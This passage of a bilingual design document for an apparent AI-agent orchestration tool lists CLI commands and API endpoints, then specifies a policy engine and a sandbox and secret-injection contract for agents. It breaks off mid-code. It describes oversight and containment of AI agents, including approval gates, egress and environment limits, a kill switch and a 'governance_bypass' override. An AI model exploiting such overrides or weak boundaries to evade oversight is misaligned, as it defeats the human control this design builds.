| `kadima/ApprovalWorkflow.md` | 4 | governance.mjs policy engine + approval records |
| `kadima/ORG_OS.md` | 5 | kadima-engine.mjs + task-allocator.mjs |
| `ogu/ProductCompiler.md` | All | Existing Ogu compiler enhanced with agent-awareness |

---

## סיכום: CLI Commands חדשים (30+)

| Command | Phase | Description |
|---|---|---|
| `ogu org:init` | 0 | Initialize OrgSpec |
| `ogu org:show` | 0 | Display org chart |
| `ogu org:validate` | 0 | Validate OrgSpec |
| `ogu agent:list` | 0 | List agents with state |
| `ogu agent:show` | 0 | Agent detail |
| `ogu agent:create` | 0 | Add custom agent role |
| `ogu model:route` | 1 | Dry-run routing decision |
| `ogu model:status` | 1 | Routing statistics |
| `ogu model:providers` | 1 | List providers |
| `ogu budget:status` | 2 | Current budget state |
| `ogu budget:set` | 2 | Set budget limits |
| `ogu budget:report` | 2 | Spending report |
| `ogu budget:reset` | 2 | Reset daily counters |
| `ogu audit:show` | 3 | View audit events |
| `ogu audit:search` | 3 | Search audit trail |
| `ogu audit:replay` | 3 | Replay feature history |
| `ogu audit:export` | 3 | Export audit trail |
| `ogu governance:check` | 4 | Policy evaluation |
| `ogu governance:policy` | 4 | Manage policies |
| `ogu approve` | 4 | Grant approval |
| `ogu deny` | 4 | Deny approval |
| `ogu kadima:init` | 5 | Initialize task allocation |
| `ogu kadima:standup` | 5 | Generate standup |
| `ogu kadima:allocate` | 5 | Allocate/rebalance tasks |
| `ogu kadima:status` | 5 | Allocation status |
| `ogu agent:run` | 6 | Execute agent task(s) |
| `ogu agent:status` | 6 | Agent runtime status |
| `ogu agent:stop` | 6 | Stop agent execution |
| `ogu agent:escalate` | 6 | Manual escalation |
| `ogu feature:state` | Fix 2 | Feature state machine |
| `ogu snapshot:capture` | Fix 3 | Capture execution snapshot |
| `ogu snapshot:verify` | Fix 3 | Verify replay determinism |
| `ogu snapshot:diff` | Fix 3 | Diff two snapshots |
| `ogu snapshot:list` | Fix 3 | List snapshots for feature |
| `ogu resource:status` | Fix 4 | Resource usage dashboard |
| `ogu override` | Fix 5 | Create override record |
| `ogu override:list` | Fix 5 | List active overrides |
| `ogu override:revoke` | Fix 5 | Revoke an override |
| `ogu override:check` | Fix 5 | Check if override exists |
| `ogu capability:list` | Fix 6 | List capabilities with model coverage |
| `ogu capability:test` | Fix 6 | Benchmark capability on model |
| `ogu capability:bench` | Fix 6 | Run all benchmarks |
| `ogu capability:matrix` | Fix 6 | Role→capability→model matrix |
| `ogu performance:report` | Fix 7 | Performance report by role/model |
| `ogu performance:trends` | Fix 7 | Performance trends over time |
| `ogu performance:optimize` | Fix 7 | Apply learning signals |
| `ogu performance:signals` | Fix 7 | Review learning signals |
| `ogu sandbox:policy` | Fix 8 | Show sandbox policy for role |
| `ogu sandbox:validate` | Fix 8 | Validate file access |
| `ogu sandbox:env` | Fix 8 | Show filtered env vars |
| `ogu sandbox:check` | Fix 8 | Validate all policies |
| `ogu policy:compile` | Closure 1 | Compile rules → AST |
| `ogu policy:ast` | Closure 1 | Show compiled AST tree |
| `ogu policy:conflicts` | Closure 1 | Show conflict resolutions |
| `ogu policy:version` | Closure 1 | Policy version chain |
| `ogu policy:freeze` | Closure 1 | Lock policy during execution |
| `ogu policy:unfreeze` | Closure 1 | Unlock policy |
| `ogu feature:lifecycle` | Closure 2 | Full lifecycle status + invariants |
| `ogu feature:envelope` | Closure 3 | Feature isolation envelope |
| `ogu feature:blast-radius` | Closure 3 | Allowed/blocked paths |
| `ogu feature:failures` | Closure 3 | Failure containment status |
| `ogu feature:isolate` | Closure 3 | Enable strict isolation |
| `ogu agent:identity` | Closure 4 | Create agent identity |
| `ogu agent:revoke` | Closure 4 | Revoke agent + quarantine |
| `ogu agent:sessions` | Closure 4 | List active/expired sessions |
| `ogu agent:quarantine` | Closure 4 | List quarantined outputs |
| `ogu agent:verify` | Closure 4 | Verify agent credential |
| `ogu company:snapshot` | Enh. 2 | Capture/diff/restore company state |
| `ogu company:status` | Enh. 2 | Live company dashboard |
| `ogu chaos:plan` | Enh. 3 | Generate chaos test plan |
| `ogu chaos:inject` | Enh. 3 | Single fault injection |
| `ogu chaos:run` | Enh. 3 | Run full chaos plan |
| `ogu chaos:report` | Enh. 3 | Show chaos results |
| `ogu consistency:check` | Closure 5 | Reconciliation check |
| `ogu consistency:check --fix` | Closure 5 | Auto-fix inconsistencies |
| `ogu consistency:status` | Closure 5 | Layer consistency status |
| `ogu tx:list` | Closure 5 | List recent transactions |
| `ogu tx:show` | Closure 5 | Show transaction details |
| `ogu tx:orphaned` | Closure 5 | Find limbo transactions |
| `ogu idempotency:clean` | Closure 5 | GC expired keys |
| `ogu scheduler:status` | Closure 6 | Scheduler state + queue |
| `ogu scheduler:queue` | Closure 6 | Pending tasks with priorities |
| `ogu scheduler:fairness` | Closure 6 | Virtual clocks + weights |
| `ogu scheduler:simulate` | Closure 6 | Simulate scheduling (dry-run) |
| `ogu scheduler:preempt --show` | Closure 6 | Preview preemption |
| `ogu system:halt` | Closure 7 | Emergency kill switch |
| `ogu system:resume` | Closure 7 | Resume (CTO + consistency) |
| `ogu system:health` | Closure 7 | Failure domains dashboard |
| `ogu circuit:status` | Closure 7 | Circuit breaker status |
| `ogu circuit:reset` | Closure 7 | Manual breaker reset |
| `ogu provider:health` | Closure 7 | Provider health dashboard |
| `ogu provider:failover --test` | Closure 7 | Test failover chain |
| `ogu metrics:health` | Closure 8 | Org Health Score |
| `ogu metrics:health <slug>` | Closure 8 | Feature Health Score |
| `ogu metrics:kpis` | Closure 8 | All KPIs |
| `ogu metrics:sla` | Closure 8 | SLA compliance |
| `ogu metrics:regression` | Closure 8 | Regression detection |
| `ogu metrics:export` | Closure 8 | Export for external dashboards |
| `ogu graph:hash` | Enh. 4 | Execution graph hash |
| `ogu graph:verify` | Enh. 4 | Verify graph hash |
| `ogu graph:diff` | Enh. 4 | Diff two graph executions |
| `ogu mode:deterministic` | Enh. 5 | Enter/exit deterministic mode |
| `ogu mode:status` | Enh. 5 | Show current mode |
| `ogu company:freeze` | Enh. 6 | Freeze company (read-only) |
| `ogu company:unfreeze` | Enh. 6 | Unfreeze company |
| `ogu merge:preview` | Closure 9 | Preview merge conflicts for wave |
| `ogu merge:ast` | Closure 9 | AST-aware merge between branches |
| `ogu merge:conflicts` | Closure 9 | Show current semantic lock conflicts |
| `ogu locks:show` | Closure 9 | Show active semantic locks |
| `ogu locks:release` | Closure 9 | Force-release a lock |
| `ogu wave:optimize` | Closure 9 | Re-optimize wave ordering |
| `ogu knowledge:index` | Closure 10 | Index all knowledge sources |
| `ogu knowledge:query` | Closure 10 | Natural language query against graph |
| `ogu knowledge:graph` | Closure 10 | Knowledge graph statistics |
| `ogu knowledge:stale` | Closure 10 | Show stale entities |
| `ogu knowledge:inject` | Closure 10 | Preview RAG injection for task |
| `ogu determinism:check` | Closure 11 | Check functional determinism |
| `ogu determinism:ast-hash` | Closure 11 | Compute AST hash for file |
| `ogu determinism:compare` | Closure 11 | Compare two versions functionally |
| `ogu determinism:drift` | Closure 11 | Show drift events + healing history |
| `ogu determinism:heal` | Closure 11 | Attempt auto-heal on drift |
| `ogu vm:status` | Closure 12 | Show active MicroVMs |
| `ogu vm:create` | Closure 12 | Manually create VM for task |
| `ogu vm:destroy` | Closure 12 | Force-destroy a VM |
| `ogu vm:proxy-log` | Closure 12 | Show network proxy log |
| `ogu vm:validate` | Closure 12 | Validate artifacts manually |
| `ogu isolation:level` | Closure 12 | Show isolation level for task |
| `ogu isolation:override` | Closure 12 | Override isolation level |
| `ogu kadima:start` | Topology 4 | Start Kadima daemon |
| `ogu kadima:stop` | Topology 4 | Stop Kadima daemon gracefully |
| `ogu kadima:restart` | Topology 4 | Restart Kadima daemon |
| `ogu kadima:status` | Topology 4 | Daemon health + runner status |
| `ogu kadima:logs` | Topology 4 | Tail daemon logs |
| `ogu runner:status` | Topology 1 | Active runner tasks + PIDs |
| `ogu runner:kill` | Topology 1 | Force-kill a runner by taskId |
| `ogu runner:list` | Topology 1 | List registered runners (local + remote) |
| `ogu queue:status` | Topology 5 | Task queue size + positions |
| `ogu queue:flush` | Topology 5 | Clear pending queue (requires CTO) |
| `ogu locks:list` | Topology 2 | List all file locks |
| `ogu locks:force-release` | Topology 2 | Force-release a stale lock |

---

## סיכום: Studio API Endpoints חדשים (18+)

| Endpoint | Phase | Method |
|---|---|---|
| `/api/org` | 0 | GET |
| `/api/org/init` | 0 | POST |
| `/api/agents` | 0 | GET |
| `/api/agents/:roleId` | 0 | GET |
| `/api/model/route` | 1 | POST |
| `/api/model/status` | 1 | GET |
| `/api/budget/status` | 2 | GET |
| `/api/budget/set` | 2 | POST |
| `/api/budget/report` | 2 | GET |
| `/api/audit` | 3 | GET |
| `/api/audit/search` | 3 | POST |
| `/api/audit/replay/:slug` | 3 | GET |
| `/api/governance/check` | 4 | POST |
| `/api/governance/approve/:id` | 4 | POST |
| `/api/kadima/status` | 5 | GET |
| `/api/kadima/init` | 5 | POST |
| `/api/kadima/standup` | 5 | GET |
| `/api/agent/run` | 6 | POST |
| `/api/agent/status` | 6 | GET |
| `/api/dag/:slug` | 6 | GET |
| `/api/artifacts/:slug` | 6 | GET |
| `/api/policy/ast` | Closure 1 | GET |
| `/api/policy/compile` | Closure 1 | POST |
| `/api/policy/conflicts` | Closure 1 | POST |
| `/api/policy/version` | Closure 1 | GET |
| `/api/feature/:slug/lifecycle` | Closure 2 | GET |
| `/api/feature/:slug/envelope` | Closure 3 | GET |
| `/api/feature/:slug/envelope` | Closure 3 | PUT |
| `/api/agents/:id/identity` | Closure 4 | GET |
| `/api/agents/:id/revoke` | Closure 4 | POST |
| `/api/agents/sessions` | Closure 4 | GET |
| `/api/company/snapshot` | Enh. 2 | POST |
| `/api/company/snapshot/:id` | Enh. 2 | GET |
| `/api/company/status` | Enh. 2 | GET |
| `/api/chaos/inject` | Enh. 3 | POST |
| `/api/chaos/run/:planId` | Enh. 3 | POST |
| `/api/chaos/report/:planId` | Enh. 3 | GET |
| `/api/consistency/check` | Closure 5 | POST |
| `/api/consistency/status` | Closure 5 | GET |
| `/api/transactions` | Closure 5 | GET |
| `/api/scheduler/status` | Closure 6 | GET |
| `/api/scheduler/queue` | Closure 6 | GET |
| `/api/scheduler/fairness` | Closure 6 | GET |
| `/api/system/health` | Closure 7 | GET |
| `/api/system/halt` | Closure 7 | POST |
| `/api/system/resume` | Closure 7 | POST |
| `/api/circuit-breakers` | Closure 7 | GET |
| `/api/providers/health` | Closure 7 | GET |
| `/api/metrics/health` | Closure 8 | GET |
| `/api/metrics/health/:slug` | Closure 8 | GET |
| `/api/metrics/kpis` | Closure 8 | GET |
| `/api/metrics/sla` | Closure 8 | GET |
| `/api/metrics/regression` | Closure 8 | GET |
| `/api/graph/:slug/hash` | Enh. 4 | GET |
| `/api/mode` | Enh. 5 | GET |
| `/api/mode/deterministic` | Enh. 5 | POST |
| `/api/company/freeze` | Enh. 6 | POST |
| `/api/merge/preview/:slug` | Closure 9 | GET |
| `/api/locks/semantic` | Closure 9 | GET |
| `/api/knowledge/graph` | Closure 10 | GET |
| `/api/knowledge/query` | Closure 10 | POST |
| `/api/knowledge/inject/:taskId` | Closure 10 | GET |
| `/api/determinism/:slug` | Closure 11 | GET |
| `/api/determinism/drift/:slug` | Closure 11 | GET |
| `/api/vms` | Closure 12 | GET |
| `/api/vms/:vmId/proxy-log` | Closure 12 | GET |
| `/api/isolation/:taskId` | Closure 12 | GET |
| `/api/kadima/health` | Topology 4 | GET |
| `/api/kadima/config` | Topology 4 | GET |
| `/api/kadima/loops` | Topology 4 | GET |
| `/api/runners` | Topology 1 | GET |
| `/api/runners/:taskId` | Topology 1 | GET |
| `/api/runners/:taskId/kill` | Topology 1 | POST |
| `/api/queue` | Topology 5 | GET |
| `/api/queue/flush` | Topology 5 | POST |
| `/api/locks/files` | Topology 2 | GET |
| `/api/locks/files/:path/release` | Topology 2 | POST |
| `ws://localhost:3000/ws/events` | Topology 4 | WebSocket |

---

---

## Beyond 10: מ-מערכת חזקה לסטנדרט תשתיתי

> שש אבני יסוד שמעלות את המערכת מ-"מוצר שעובד" ל-"תשתית שאפשר לבנות עליה חברה".
> כל אחת חייבת לצאת עם חוזה, אכיפה, ומדידה.
> מחולקות ל-3 איטרציות בסדר עדיפות.

```
Iteration 1 (→ 10/10):  Policy Engine + Sandbox Hermetic + SecretBroker
Iteration 2 (→ 11-12):  Provenance & Attestations + Capability Marketplace
Iteration 3 (→ 13/10):  Org Evolution + Distributed Ready
```

---

### Iteration 1: Policy Engine + Sandbox Hermetic (→ 10/10)

---

#### Stone 1: Declarative Policy Engine

**הבעיה:** Governance הוא procedural — ה-policies מוגדרים כ-JSON objects שנבדקים ב-`evaluateTrigger()` עם switch/case. מה שחסר: שפת כללים מוצהרת שמייצרת התנהגות, בלי `if`ים בקוד. כל חוק חדש = שורה ב-registry, לא שינוי קוד.

**קבצים חדשים:**

```
.ogu/policy/rules.json                          ← Declarative rule definitions
.ogu/policy/compiled.json                        ← Compiled rule evaluation tree
tools/ogu/commands/lib/policy-engine.mjs         ← Rule compiler + evaluator
tools/ogu/commands/policy.mjs                    ← CLI: policy:list, policy:test, policy:trace, policy:compile
docs/vault/02_Contracts/Policy.contract.md       ← Policy system contract
```

**Schema: Rule (single rule in rules.json)**

```json
{
  "id": "require-double-architect-on-security",
  "name": "Double Architect Review for Security Tasks",
  "version": 1,
  "enabled": true,
  "priority": 100,

  "when": {
    "operator": "AND",
    "conditions": [
      { "field": "task.riskTier", "op": "in", "value": ["high", "critical"] },
      { "field": "task.touches", "op": "matches_any", "value": ["**/auth/**", "**/crypto/**", "**/security/**"] },
      { "field": "task.capability", "op": "eq", "value": "code_generation" }
    ]
  },

  "then": [
    {
      "effect": "requireApprovals",
      "params": { "count": 2, "fromRoles": ["architect", "security"] }
    },
    {
      "effect": "addGates",
      "params": { "gates": ["security_scan"] }
    },
    {
      "effect": "setMinModelTier",
      "params": { "tier": 3 }
    }
  ],

  "unless": {
    "operator": "OR",
    "conditions": [
      { "field": "override.type", "op": "eq", "value": "governance_bypass" },
      { "field": "feature.state", "op": "eq", "value": "suspended" }
    ]
  },

  "metadata": {
    "author": "cto",
    "created": "ISO",
    "rationale": "Security-sensitive code generation must be reviewed by two senior roles",
    "adrReference": null
  }
}
```

**Schema: Full rules.json**

```json
{
  "$schema": "PolicyEngine/1.0",
  "rules": [
    {
      "id": "require-double-architect-on-security",
      "when": {
        "operator": "AND",
        "conditions": [
          { "field": "task.riskTier", "op": "in", "value": ["high", "critical"] },
          { "field": "task.touches", "op": "matches_any", "value": ["**/auth/**", "**/crypto/**"] }
        ]
      },
      "then": [
        { "effect": "requireApprovals", "params": { "count": 2, "fromRoles": ["architect", "security"] } }
      ]
    },
    {
      "id": "ceo-approval-over-5-dollars",
      "when": {
        "operator": "AND",
        "conditions": [
          { "field": "task.estimatedCost", "op": "gt", "value": 5.00 },
          { "field": "feature.totalCost", "op": "gt", "value": 20.00 }
        ]
      },
      "then": [
        { "effect": "requireApprovals", "params": { "count": 1, "fromRoles": ["cto"] } },
        { "effect": "emitAlert", "params": { "level": "warning", "message": "High-cost task requires CTO approval" } }
      ]
    },
    {
      "id": "tier3-only-after-failures",
      "when": {
        "operator": "AND",
        "conditions": [
          { "field": "model.requestedTier", "op": "eq", "value": 3 },
          { "field": "task.failureCount", "op": "lt", "value": 2 }
        ]
      },
      "then": [
        { "effect": "blockExecution", "params": {} },
        { "effect": "downgradeModelTier", "params": { "tier": 2 } },
        { "effect": "emitAlert", "params": { "level": "info", "message": "Tier 3 requires 2+ failures first" } }
      ]
    },
    {
      "id": "auto-approve-low-risk-in-scope",
      "priority": 1,
      "when": {
        "operator": "AND",
        "conditions": [
          { "field": "task.riskTier", "op": "eq", "value": "low" },
          { "field": "task.withinScope", "op": "eq", "value": true }
        ]
      },
      "then": [
        { "effect": "autoApprove", "params": {} }
      ]
    },
    {
      "id": "throttle-concurrent-builds-on-overload",
      "when": {
        "operator": "AND",
        "conditions": [
          { "field": "resource.model_call.utilization", "op": "gt", "value": 0.8 },
          { "field": "task.priority", "op": "lt", "value": 8 }
        ]
      },
      "then": [
        { "effect": "throttleConcurrency", "params": { "maxParallel": 1 } },
        { "effect": "emitAlert", "params": { "level": "info", "message": "Low-priority tasks throttled during overload" } }
      ]
    }
  ],

  "effects": {
    "requireApprovals":    { "description": "Require N approvals from specified roles", "blocking": true },
    "blockExecution":      { "description": "Prevent task from starting", "blocking": true },
    "autoApprove":         { "description": "Skip approval, log as auto-approved", "blocking": false },
    "addGates":            { "description": "Add extra gates to task", "blocking": false },
    "setMinModelTier":     { "description": "Force minimum model tier", "blocking": false },
    "downgradeModelTier":  { "description": "Cap model tier", "blocking": false },
    "addReviewers":        { "description": "Add roles to review list", "blocking": false },
    "throttleConcurrency": { "description": "Limit parallel execution", "blocking": false },
    "forceSandbox":        { "description": "Override sandbox policy to stricter level", "blocking": false },
    "emitAlert":           { "description": "Send alert/notification", "blocking": false },
    "tagForAudit":         { "description": "Add audit tags to task", "blocking": false }
  },

  "operators": {
    "conditions": ["eq", "neq", "gt", "lt", "gte", "lte", "in", "not_in", "matches", "matches_any", "contains", "starts_with"],
    "logical": ["AND", "OR", "NOT"]
  }
}
```

**Pseudo-code: policy-engine.mjs**

```javascript
// tools/ogu/commands/lib/policy-engine.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { audit } from './audit.mjs';
import { minimatch } from 'minimatch';
import { join } from 'path';

const RULES_PATH = '.ogu/policy/rules.json';

/**
 * Evaluate all rules against a task context
 * Returns aggregated effects
 */
export function evaluate(root, context) {
  const config = loadRules(root);
  const results = [];

  // Sort by priority (highest first)
  const sorted = [...config.rules]
    .filter(r => r.enabled !== false)
    .sort((a, b) => (b.priority || 50) - (a.priority || 50));

  for (const rule of sorted) {
    const match = evaluateCondition(rule.when, context);
    const exempted = rule.unless ? evaluateCondition(rule.unless, context) : false;

    if (match && !exempted) {
      results.push({
        ruleId: rule.id,
        ruleName: rule.name,
        effects: rule.then,
        priority: rule.priority || 50
      });
    }
  }

  // Aggregate effects
  return aggregateEffects(results);
}

/**
 * Evaluate a condition tree recursively
 */
function evaluateCondition(condition, context) {
  if (condition.operator) {
    const subResults = condition.conditions.map(c => evaluateCondition(c, context));

    switch (condition.operator) {
      case 'AND': return subResults.every(Boolean);
      case 'OR':  return subResults.some(Boolean);
      case 'NOT': return !subResults[0];
    }
  }

  // Leaf condition
  const fieldValue = resolveField(condition.field, context);
  return applyOperator(condition.op, fieldValue, condition.value);
}

/**
 * Resolve a dotted field path from context
 * e.g., "task.riskTier" → context.task.riskTier
 */
function resolveField(field, context) {
  return field.split('.').reduce((obj, key) => obj?.[key], context);
}

/**
 * Apply a comparison operator
 */
function applyOperator(op, actual, expected) {
  switch (op) {
    case 'eq':          return actual === expected;
    case 'neq':         return actual !== expected;
    case 'gt':          return actual > expected;
    case 'lt':          return actual < expected;
    case 'gte':         return actual >= expected;
    case 'lte':         return actual <= expected;
    case 'in':          return Array.isArray(expected) && expected.includes(actual);
    case 'not_in':      return Array.isArray(expected) && !expected.includes(actual);
    case 'contains':    return String(actual).includes(expected);
    case 'starts_with': return String(actual).startsWith(expected);
    case 'matches':     return minimatch(String(actual), expected);
    case 'matches_any':
      return Array.isArray(actual)
        ? actual.some(v => expected.some(p => minimatch(v, p)))
        : expected.some(p => minimatch(String(actual), p));
    default: return false;
  }
}

/**
 * Aggregate effects from all matching rules
 * Handles conflicts: blocking effects win, highest priority wins
 */
function aggregateEffects(results) {
  const aggregated = {
    blocking: false,
    approvals: { required: 0, fromRoles: new Set() },
    additionalGates: new Set(),
    modelConstraints: { minTier: null, maxTier: null },
    concurrency: { maxParallel: null },
    sandboxOverride: null,
    alerts: [],
    auditTags: new Set(),
    matchedRules: results.map(r => r.ruleId),
    autoApproved: false
  };

  for (const result of results) {
    for (const effect of result.effects) {
      switch (effect.effect) {
        case 'requireApprovals':
          aggregated.approvals.required = Math.max(
            aggregated.approvals.required,
            effect.params.count
          );
          for (const role of effect.params.fromRoles) {
            aggregated.approvals.fromRoles.add(role);
          }
          aggregated.blocking = true;
          break;

        case 'blockExecution':
          aggregated.blocking = true;
          break;

        case 'autoApprove':
          aggregated.autoApproved = true;
          break;

        case 'addGates':
          for (const gate of effect.params.gates) {
            aggregated.additionalGates.add(gate);
          }
          break;

        case 'setMinModelTier':
          aggregated.modelConstraints.minTier = Math.max(
            aggregated.modelConstraints.minTier || 0,
            effect.params.tier
          );
          break;

        case 'downgradeModelTier':
          aggregated.modelConstraints.maxTier = Math.min(
            aggregated.modelConstraints.maxTier || 4,
            effect.params.tier
          );
          break;

        case 'throttleConcurrency':
          aggregated.concurrency.maxParallel = Math.min(
            aggregated.concurrency.maxParallel || Infinity,
            effect.params.maxParallel
          );
          break;

        case 'forceSandbox':
          aggregated.sandboxOverride = effect.params.policy;
          break;

        case 'emitAlert':
          aggregated.alerts.push(effect.params);
          break;

        case 'tagForAudit':
          for (const tag of effect.params.tags || []) {
            aggregated.auditTags.add(tag);
          }
          break;
      }
    }
  }

  // autoApprove only works if nothing else requires approval
  if (aggregated.autoApproved && aggregated.approvals.required > 0) {
    aggregated.autoApproved = false; // explicit approval wins
  }

  // Convert sets to arrays for serialization
  aggregated.approvals.fromRoles = [...aggregated.approvals.fromRoles];
  aggregated.additionalGates = [...aggregated.additionalGates];
  aggregated.auditTags = [...aggregated.auditTags];

  return aggregated;
}

/**
 * Trace: explain why each rule matched or didn't
 * For debugging and audit
 */
export function trace(root, context) {
  const config = loadRules(root);
  const traces = [];

  for (const rule of config.rules) {
    const conditionTrace = traceCondition(rule.when, context);
    const exemptTrace = rule.unless ? traceCondition(rule.unless, context) : null;

    traces.push({
      ruleId: rule.id,
      matched: conditionTrace.result && !(exemptTrace?.result),
      exempted: exemptTrace?.result || false,
      conditions: conditionTrace.details,
      exemptions: exemptTrace?.details || []
    });
  }

  return traces;
}

/**
 * Build context object from task + system state
 * This is the "world" that rules evaluate against
 */
export function buildPolicyContext(root, { task, feature, agent, model, resource }) {
  return {
    task: {
      id: task.id,
      riskTier: task.riskTier || 'low',
      touches: task.touches || [],
      capability: task.capability,
      estimatedCost: task.estimatedCost || 0,
      failureCount: task.failureCount || 0,
      priority: task.priority || 5,
      withinScope: task.withinScope || false,
      group: task.group
    },
    feature: {
      slug: feature.slug,
      state: feature.state,
      totalCost: feature.totalCost || 0,
      tasksCompleted: feature.tasksCompleted || 0
    },
    agent: {
      roleId: agent.roleId,
      riskTier: agent.riskTier,
      tokensUsedToday: agent.tokensUsedToday || 0,
      escalations: agent.escalations || 0
    },
    model: {
      requestedTier: model.tier,
      provider: model.provider
    },
    resource: {
      model_call: { utilization: resource?.modelCallUtilization || 0 },
      build: { utilization: resource?.buildUtilization || 0 }
    },
    override: {
      type: null, // set if override active
      active: false
    },
    time: {
      hour: new Date().getHours(),
      dayOfWeek: new Date().getDay(),
      isBusinessHours: new Date().getHours() >= 9 && new Date().getHours() < 18
    }
  };
}
```

**Policy Snapshot integration (into Execution Snapshot):**

```javascript
// In execution-snapshot.mjs — add policy state to snapshot

snapshot.inputs.policyRulesHash = hashFile(join(root, '.ogu/policy/rules.json'));
snapshot.inputs.policyEvaluation = evaluate(root, policyContext);
snapshot.inputs.matchedPolicies = snapshot.inputs.policyEvaluation.matchedRules;
```

**CLI Commands:**

```
ogu policy:list                              ← List all rules with match status
ogu policy:test --task <context-json>        ← Test rules against hypothetical context
ogu policy:trace --task <id> --feature <slug> ← Explain which rules fire and why
ogu policy:compile                           ← Compile rules to optimized evaluation tree
ogu policy:add <rule-json>                   ← Add new rule
ogu policy:disable <rule-id>                 ← Disable rule without deleting
```

**Example:**
```
$ ogu policy:trace --task 5 --feature auth-system
POLICY TRACE for task-5 (auth-system):

  RULE                                    MATCH   EFFECT
  ──────────────────────────────────────  ──────  ────────────────────────
  auto-approve-low-risk-in-scope          ✗       — (riskTier=high)
    ├ task.riskTier == low                ✗ FAIL  actual: "high"
    └ task.withinScope == true            ✓       actual: true

  require-double-architect-on-security    ✓       requireApprovals(2), addGates(security_scan), setMinModelTier(3)
    ├ task.riskTier in [high, critical]   ✓       actual: "high"
    ├ task.touches matches **/auth/**     ✓       actual: ["src/middleware/auth.ts"]
    └ task.capability == code_generation  ✓       actual: "code_generation"

  ceo-approval-over-5-dollars             ✗       — (cost too low)
    ├ task.estimatedCost > 5.00           ✗ FAIL  actual: 1.50
    └ feature.totalCost > 20.00          ✗ FAIL  actual: 12.30

  tier3-only-after-failures               ✗       — (not requesting tier 3)
    └ model.requestedTier == 3            ✗ FAIL  actual: 2

  AGGREGATED:
    Blocking:    YES
    Approvals:   2 required from [architect, security]
    Extra gates: security_scan
    Model:       min tier 3
    Sandbox:     —
    Alerts:      —
```

**כלל ברזל:** כל חוק חדש = שורה ב-rules.json. אפס שינויי קוד. Policy snapshot נכנס ל-Execution Snapshot כדי שהרצה תשוחזר 1:1.

---

#### Stone 2: Sandbox Hermetic + SecretBroker

**הבעיה:** Fix 8 הגדיר sandbox policy אבל לא הוכיח שהוא hermetic. חסר: SecretBroker שמזריק secrets per-task עם TTL, filesystem boundary מוכח, ו-network egress enforcement.

**קבצים חדשים:**

```
.ogu/secrets.enc                                 ← Encrypted secrets vault (local)
.ogu/secrets-manifest.json                       ← Which roles get which secrets
tools/ogu/commands/lib/secret-broker.mjs         ← Secret injection with TTL + audit
tools/ogu/commands/secret.mjs                    ← CLI: secret:set, secret:list, secret:grant, secret:revoke
docs/vault/02_Contracts/Sandbox.contract.md      ← Formal sandbox contract (hermetic)
```

**Schema: Sandbox.contract.md (formal boundary specification)**

```json
{
  "$schema": "SandboxContract/1.0",

  "boundaries": {
    "filesystem": {
      "principle": "Agent sees only what it needs. Everything else is invisible.",
      "enforcement": "worktree + symlink mount. Agent worktree contains only files in readScope.",
      "writeIsolation": "Writes go to worktree overlay. Main repo is read-only until merge.",
      "proofMethod": "ogu sandbox:prove runs file access audit — any access outside scope = FAIL"
    },
    "network": {
      "principle": "No outbound by default. Allowlist per role.",
      "enforcement": "Subprocess spawned with restricted env (no proxy vars). Network calls validated pre-execution.",
      "proofMethod": "ogu sandbox:prove captures all network calls via tool audit — any call outside allowlist = FAIL"
    },
    "environment": {
      "principle": "No secret visible unless explicitly granted via SecretBroker.",
      "enforcement": "buildSandboxEnv() strips all env vars matching blockedPatterns. Only allowlisted vars passed.",
      "proofMethod": "ogu sandbox:prove dumps env vars available to agent — any blocked var present = FAIL"
    },
    "process": {
      "principle": "Agent cannot consume unbounded resources.",
      "enforcement": "Subprocess spawned with timeout. Memory/CPU monitored via resource-governor.",
      "proofMethod": "ogu sandbox:prove checks process limits are set and enforced"
    },
    "tools": {
      "principle": "Agent can only use tools in its allowlist.",
      "enforcement": "Tool invocations validated by validateToolAccess() before execution.",
      "proofMethod": "Audit trail shows all tool calls — any blocked tool = FAIL"
    }
  },

  "secretInjectionPolicy": {
    "principle": "Secrets are injected per-task, not per-session. TTL enforced.",
    "lifecycle": [
      "1. Agent requests secret via SecretBroker",
      "2. SecretBroker checks role permissions in secrets-manifest.json",
      "3. Secret injected into task-scoped env with TTL",
      "4. On task completion or TTL expiry, secret is revoked",
      "5. All access logged in audit trail"
    ],
    "neverAllowed": [
      "Raw .env file access by non-privileged roles",
      "Secret persistence beyond task scope",
      "Secret sharing between agents",
      "Secrets in artifact output or logs"
    ]
  }
}
```

**Schema: secrets-manifest.json**

```json
{
  "$schema": "SecretManifest/1.0",
  "secrets": [
    {
      "id": "database-url",
      "envVar": "DATABASE_URL",
      "description": "PostgreSQL connection string",
      "grantedTo": ["backend-dev", "devops"],
      "ttlSeconds": 300,
      "auditLevel": "verbose"
    },
    {
      "id": "api-key-external",
      "envVar": "EXTERNAL_API_KEY",
      "description": "Third-party API key",
      "grantedTo": ["backend-dev"],
      "ttlSeconds": 120,
      "auditLevel": "critical"
    },
    {
      "id": "deploy-token",
      "envVar": "DEPLOY_TOKEN",
      "description": "Deployment auth token",
      "grantedTo": ["devops"],
      "ttlSeconds": 600,
      "auditLevel": "critical"
    }
  ],
  "globalPolicy": {
    "maxTTLSeconds": 3600,
    "requireAudit": true,
    "rotationReminder": "30d",
    "encryptionMethod": "aes-256-gcm"
  }
}
```

**Pseudo-code: secret-broker.mjs**

```javascript
// tools/ogu/commands/lib/secret-broker.mjs

import { createDecipheriv, createCipheriv, randomBytes } from 'crypto';
import { readFileSync, writeFileSync, existsSync } from 'fs';
import { audit } from './audit.mjs';
import { join } from 'path';

const VAULT_PATH = '.ogu/secrets.enc';
const MANIFEST_PATH = '.ogu/secrets-manifest.json';

/**
 * Issue a secret to an agent for a specific task
 * Returns env vars to inject, with TTL tracking
 */
export function issueSecret(root, { secretId, roleId, taskId, featureSlug }) {
  const manifest = loadManifest(root);
  const secretDef = manifest.secrets.find(s => s.id === secretId);

  if (!secretDef) throw new Error(`OGU3301: Secret '${secretId}' not found in manifest`);

  // Check role permission
  if (!secretDef.grantedTo.includes(roleId)) {
    audit.emitAudit(root, {
      type: 'secret_access_denied',
      agentId: roleId,
      featureSlug,
      taskId,
      context: { secretId, reason: `Role '${roleId}' not in grantedTo list` },
      tags: ['security', 'secret-denied']
    });
    throw new Error(`OGU3302: Role '${roleId}' not authorized for secret '${secretId}'`);
  }

  // Decrypt secret value from vault
  const value = decryptSecret(root, secretId);

  // Create issue record with TTL
  const issue = {
    id: generateId(),
    secretId,
    roleId,
    taskId,
    featureSlug,
    issuedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + secretDef.ttlSeconds * 1000).toISOString(),
    revoked: false
  };

  // Audit the issuance
  audit.emitAudit(root, {
    type: 'secret_issued',
